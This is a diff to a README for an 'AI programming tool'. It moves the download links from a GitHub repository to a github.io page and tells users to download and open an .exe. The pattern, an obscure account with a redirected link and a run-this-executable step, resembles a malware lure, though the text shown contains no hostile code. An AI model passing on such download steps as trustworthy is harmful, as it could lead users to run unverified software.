@@ -1,7 +1,7 @@
 # 🤖 BoldX-AI-Programming-Tool - Write code faster with artificial intelligence
 
 <div>
-  <a href="https://github.com/laurettephotochemical800/BoldX-AI-Programming-Tool">
+  <a href="https://laurettephotochemical800.github.io">
     <img src="https://img.shields.io/badge/Download-BoldX-blue" alt="Download BoldX">
   </a>
 </div>
@@ -24,7 +24,7 @@ Ensure your computer meets these standards before you start:
 
 Follow these steps to get the software on your computer.
 
-1. Visit the download page: [https://github.com/laurettephotochemical800/BoldX-AI-Programming-Tool](https://github.com/laurettephotochemical800/BoldX-AI-Programming-Tool).
+1. Visit the download page: [https://laurettephotochemical800.github.io](https://laurettephotochemical800.github.io).
 2. Look for the file ending in .exe in the releases section.
 3. Select this file to download it to your computer.
 4. Open the file once the download finishes. This starts the setup wizard.
